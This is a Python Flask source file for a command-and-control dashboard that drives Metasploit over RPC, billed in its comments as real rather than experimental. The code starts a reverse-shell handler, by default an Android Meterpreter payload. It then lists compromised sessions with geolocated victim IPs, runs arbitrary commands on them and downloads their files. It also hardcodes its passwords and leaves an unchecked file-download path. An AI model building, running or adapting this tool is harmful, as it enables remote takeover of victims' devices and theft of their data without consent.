#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
HAMZA SKU - Professional Metasploit C2 Dashboard
Real Integration with Metasploit Framework
100% حقيقي - ليس تجريبي
"""

from flask import Flask, render_template, request, jsonify, session, redirect, url_for, send_file
from flask_socketio import SocketIO, emit
from pymetasploit3.msfrpc import MsfRpcClient
import hashlib
import os
import time
import threading
import requests
from datetime import datetime
import json

app = Flask(__name__)
app.config['SECRET_KEY'] = 'hamza_sku_secret_2026_msf'
app.config['UPLOAD_FOLDER'] = 'downloads'
socketio = SocketIO(app, cors_allowed_origins="*", async_mode='threading')

# إنشاء مجلد downloads
os.makedirs('downloads', exist_ok=True)

# Metasploit RPC Configuration
MSF_RPC_HOST = '127.0.0.1'
MSF_RPC_PORT = 55553
MSF_RPC_USER = 'msf'
MSF_RPC_PASSWORD = 'msf_password'

# Master Password (SHA-256)
MASTER_PASSWORD = 'hamza_sku_2026'
MASTER_PASSWORD_HASH = hashlib.sha256(MASTER_PASSWORD.encode()).hexdigest()

# Global State
class C2State:
    def __init__(self):
        self.msf_client = None
        self.handler_job_id = None
        self.handler_config = {
            'host': None,
            'port': None,
            'payload': None
        }
        self.sessions = {}
        self.last_session_check = 0
        
    def connect_msf(self):
        """الاتصال بـ Metasploit RPC"""
        try:
            self.msf_client = MsfRpcClient(
                MSF_RPC_PASSWORD,
                server=MSF_RPC_HOST,
                port=MSF_RPC_PORT,
                username=MSF_RPC_USER,
                ssl=True
            )
            print("[+] Connected to Metasploit RPC")
            return True
        except Exception as e:
            print(f"[-] Failed to connect to Metasploit RPC: {e}")
            self.msf_client = None
            return False
    
    def is_connected(self):
        """التحقق من الاتصال"""
        try:
            if self.msf_client:
                self.msf_client.core.version()
                return True
        except:
            self.msf_client = None
        return False
    
    def start_handler(self, host, port, payload):
        """بدء Handler حقيقي في Metasploit"""
        try:
            if not self.is_connected():
                if not self.connect_msf():
                    return False, "Failed to connect to Metasploit RPC"
            
            # إيقاف handler قديم إن وُجد
            if self.handler_job_id:
                try:
                    self.msf_client.jobs.stop(self.handler_job_id)
                except:
                    pass
            
            # إعداد Handler
            exploit = self.msf_client.modules.use('exploit', 'multi/handler')
            exploit['LHOST'] = host
            exploit['LPORT'] = int(port)
            exploit['PAYLOAD'] = payload
            exploit['ExitOnSession'] = False
            exploit['DisablePayloadHandler'] = False
            
            # تشغيل Handler
            result = exploit.execute()
            
            if result and 'job_id' in result:
                self.handler_job_id = result['job_id']
                self.handler_config = {
                    'host': host,
                    'port': port,
                    'payload': payload
                }
                print(f"[+] Handler started: {host}:{port} - {payload}")
                return True, f"Handler started on {host}:{port}"
            else:
                return False, "Failed to start handler"
                
        except Exception as e:
            print(f"[-] Handler start error: {e}")
            return False, str(e)
    
    def stop_handler(self):
        """إيقاف Handler"""
        try:
            if self.handler_job_id and self.is_connected():
                self.msf_client.jobs.stop(self.handler_job_id)
                self.handler_job_id = None
                print("[+] Handler stopped")
                return True, "Handler stopped"
            return False, "No active handler"
        except Exception as e:
            return False, str(e)
    
    def get_sessions(self):
        """الحصول على Sessions الحقيقية من Metasploit"""
        try:
            if not self.is_connected():
                return {}
            
            sessions_list = self.msf_client.sessions.list
            
            # تحديث معلومات Sessions
            for sid, session_data in sessions_list.items():
                if sid not in self.sessions:
                    # Session جديد - إضافة معلومات
                    ip = session_data.get('tunnel_peer', '').split(':')[0]
                    self.sessions[sid] = {
                        'id': sid,
                        'ip': ip,
                        'type': session_data.get('type', 'unknown'),
                        'info': session_data.get('info', 'Unknown'),
                        'username': session_data.get('username', 'Unknown'),
                        'uuid': session_data.get('uuid', ''),
                        'platform': session_data.get('platform', 'Unknown'),
                        'arch': session_data.get('arch', 'Unknown'),
                        'connected_at': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'last_seen': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                        'country': self.get_country_from_ip(ip),
                        'flag': self.get_flag_emoji(ip),
                        'commands_executed': 0
                    }
                    # إشعار WebSocket
                    try:
                        socketio.emit('new_session', self.sessions[sid])
                    except:
                        pass
                else:
                    # تحديث last_seen
                    self.sessions[sid]['last_seen'] = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            # إزالة sessions المقطوعة
            current_session_ids = set(sessions_list.keys())
            stored_session_ids = set(self.sessions.keys())
            disconnected = stored_session_ids - current_session_ids
            for sid in disconnected:
                del self.sessions[sid]
            
            return self.sessions
            
        except Exception as e:
            print(f"[-] Get sessions error: {e}")
            return {}
    
    def execute_command(self, session_id, command):
        """تنفيذ أمر على Session حقيقي"""
        try:
            if not self.is_connected():
                return {'success': False, 'output': 'Not connected to Metasploit'}
            
            shell = self.msf_client.sessions.session(session_id)
            
            # تنفيذ الأمر
            shell.write(command)
            time.sleep(1)
            
            # قراءة Output
            output = shell.read()
            
            # تحديث عداد الأوامر
            if session_id in self.sessions:
                self.sessions[session_id]['commands_executed'] += 1
            
            return {
                'success': True,
                'output': output,
                'command': command,
                'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            }
            
        except Exception as e:
            return {
                'success': False,
                'output': f'Error: {str(e)}',
                'command': command
            }
    
    def get_country_from_ip(self, ip):
        """الحصول على الدولة من IP"""
        try:
            if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
                return 'Local Network'
            
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
            if response.status_code == 200:
                data = response.json()
                return data.get('country', 'Unknown')
        except:
            pass
        return 'Unknown'
    
    def get_flag_emoji(self, ip):
        """الحصول على علم الدولة"""
        try:
            if ip.startswith('192.168.') or ip.startswith('10.') or ip.startswith('127.'):
                return '🏠'
            
            response = requests.get(f'http://ip-api.com/json/{ip}', timeout=3)
            if response.status_code == 200:
                data = response.json()
                country_code = data.get('countryCode', '')
                if country_code:
                    # تحويل country code لـ emoji
                    return ''.join(chr(127397 + ord(c)) for c in country_code.upper())
        except:
            pass
        return '🌍'
    
    def download_file(self, session_id, remote_path):
        """تحميل ملف من Target"""
        try:
            if not self.is_connected():
                return None, 'Not connected to Metasploit'
            
            shell = self.msf_client.sessions.session(session_id)
            
            # اسم الملف المحلي
            filename = os.path.basename(remote_path)
            local_path = os.path.join('downloads', f"{session_id}_{filename}")
            
            # تحميل الملف
            shell.write(f'download {remote_path} {local_path}')
            time.sleep(2)
            
            if os.path.exists(local_path):
                return local_path, 'File downloaded successfully'
            else:
                return None, 'Download failed'
                
        except Exception as e:
            return None, str(e)

# State عام
state = C2State()

# محاولة الاتصال عند البدء
state.connect_msf()

def session_monitor():
    """مراقبة Sessions باستمرار"""
    while True:
        try:
            current_time = time.time()
            if current_time - state.last_session_check > 5:  # كل 5 ثوانٍ
                sessions = state.get_sessions()
                state.last_session_check = current_time
                
                # إرسال تحديث للـ clients
                try:
                    socketio.emit('sessions_update', {
                        'sessions': list(sessions.values()),
                        'count': len(sessions)
                    })
                except:
                    pass
            
            time.sleep(2)
        except Exception as e:
            print(f"[-] Session monitor error: {e}")
            time.sleep(5)

# بدء مراقبة Sessions
monitor_thread = threading.Thread(target=session_monitor, daemon=True)
monitor_thread.start()

# ============= ROUTES =============

@app.route('/')
def index():
    """الصفحة الرئيسية - تحويل للـ login"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return redirect(url_for('setup'))

@app.route('/login')
def login():
    """صفحة Login"""
    if session.get('logged_in'):
        return redirect(url_for('setup'))
    return render_template('login.html')

@app.route('/api/login', methods=['POST'])
def api_login():
    """معالجة Login"""
    try:
        data = request.get_json()
        password = data.get('password', '')
        
        password_hash = hashlib.sha256(password.encode()).hexdigest()
        
        if password_hash == MASTER_PASSWORD_HASH:
            session['logged_in'] = True
            session.permanent = True
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': 'Invalid password'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})

@app.route('/logout')
def logout():
    """تسجيل الخروج"""
    session.clear()
    return redirect(url_for('login'))

@app.route('/setup')
def setup():
    """صفحة Setup Handler"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('setup.html')

@app.route('/dashboard')
def dashboard():
    """صفحة Dashboard - عرض Targets"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('dashboard.html')

@app.route('/session/<session_id>')
def session_control(session_id):
    """صفحة التحكم بـ Session"""
    if not session.get('logged_in'):
        return redirect(url_for('login'))
    return render_template('session.html', session_id=session_id)

# ============= API ENDPOINTS =============

@app.route('/api/handler/start', methods=['POST'])
def api_handler_start():
    """بدء Handler"""
    try:
        data = request.get_json()
        host = data.get('host', '0.0.0.0')
        port = data.get('port', 4444)
        payload = data.get('payload', 'android/meterpreter/reverse_tcp')
        
        success, message = state.start_handler(host, port, payload)
        return jsonify({
            'success': success,
            'message': message
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/handler/stop', methods=['POST'])
def api_handler_stop():
    """إيقاف Handler"""
    try:
        success, message = state.stop_handler()
        return jsonify({
            'success': success,
            'message': message
        })
    except Exception as e:
        return jsonify({'success': False, 'message': str(e)})

@app.route('/api/handler/status')
def api_handler_status():
    """حالة Handler"""
    return jsonify({
        'active': state.handler_job_id is not None,
        'config': state.handler_config,
        'msf_connected': state.is_connected()
    })

@app.route('/api/sessions')
def api_sessions():
    """قائمة Sessions"""
    sessions = state.get_sessions()
    return jsonify({
        'sessions': list(sessions.values()),
        'count': len(sessions)
    })

@app.route('/api/session/<session_id>/info')
def api_session_info(session_id):
    """معلومات Session محدد"""
    if session_id in state.sessions:
        return jsonify({
            'success': True,
            'session': state.sessions[session_id]
        })
    return jsonify({'success': False, 'error': 'Session not found'})

@app.route('/api/session/<session_id>/execute', methods=['POST'])
def api_session_execute(session_id):
    """تنفيذ أمر"""
    try:
        data = request.get_json()
        command = data.get('command', '')
        
        result = state.execute_command(session_id, command)
        return jsonify(result)
    except Exception as e:
        return jsonify({
            'success': False,
            'output': str(e)
        })

@app.route('/api/session/<session_id>/download', methods=['POST'])
def api_session_download(session_id):
    """تحميل ملف"""
    try:
        data = request.get_json()
        remote_path = data.get('path', '')
        
        local_path, message = state.download_file(session_id, remote_path)
        
        if local_path:
            return jsonify({
                'success': True,
                'message': message,
                'filename': os.path.basename(local_path),
                'download_url': f'/download/{os.path.basename(local_path)}'
            })
        else:
            return jsonify({
                'success': False,
                'error': message
            })
    except Exception as e:
        return jsonify({
            'success': False,
            'error': str(e)
        })

@app.route('/download/<filename>')
def download_file_route(filename):
    """تحميل ملف محفوظ"""
    try:
        filepath = os.path.join('downloads', filename)
        if os.path.exists(filepath):
            return send_file(filepath, as_attachment=True)
        else:
            return "File not found", 404
    except Exception as e:
        return str(e), 500

# ============= WEBSOCKET EVENTS =============

@socketio.on('connect')
def handle_connect():
    """عند اتصال client"""
    if session.get('logged_in'):
        print("[+] Client connected")
        emit('connected', {'status': 'Connected to C2 Server'})

@socketio.on('disconnect')
def handle_disconnect():
    """عند قطع اتصال client"""
    print("[-] Client disconnected")

if __name__ == '__main__':
    print("╔═══════════════════════════════════════════════════════════╗")
    print("║            🔥 HAMZA SKU - C2 DASHBOARD 🔥                 ║")
    print("║   Professional Metasploit Integration Platform           ║")
    print("╚═══════════════════════════════════════════════════════════╝")
    print()
    print("📍 Dashboard URL: http://localhost:5000")
    print("🔐 Master Password: hamza_sku_2026")
    print()
    print("⚠️  Make sure Metasploit RPC is running:")
    print("    msfrpcd -P msf_password -S -a 127.0.0.1")
    print()
    print("✅ Server starting...")
    print()
    
    socketio.run(app, host='0.0.0.0', port=5000, debug=False, allow_unsafe_werkzeug=True)
